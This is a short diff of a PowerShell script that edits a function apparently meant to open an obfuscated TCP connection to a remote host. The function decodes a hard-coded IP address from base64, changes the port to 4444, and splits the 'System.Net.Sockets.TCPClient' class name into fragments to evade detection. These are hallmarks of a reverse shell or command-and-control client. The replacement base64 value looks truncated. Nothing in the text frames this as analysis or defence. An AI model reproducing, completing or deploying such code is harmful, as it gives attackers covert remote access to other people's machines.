@@ -18,8 +18,8 @@ function Test-ExecutionPolicy {
 
 function Get-ObfuscatedTCPClient {
     # Obfuscate IP (already base64 encoded)
-    $ip = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("MTU5LjU0LjE0NC4xMTg="))
-    $port = 4992
+    $ip = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("MTU5LjU0Lj="))
+    $port = 4444
     
     # Obfuscate "System.Net.Sockets.TCPClient"
     $s1 = "Sy" + "st"
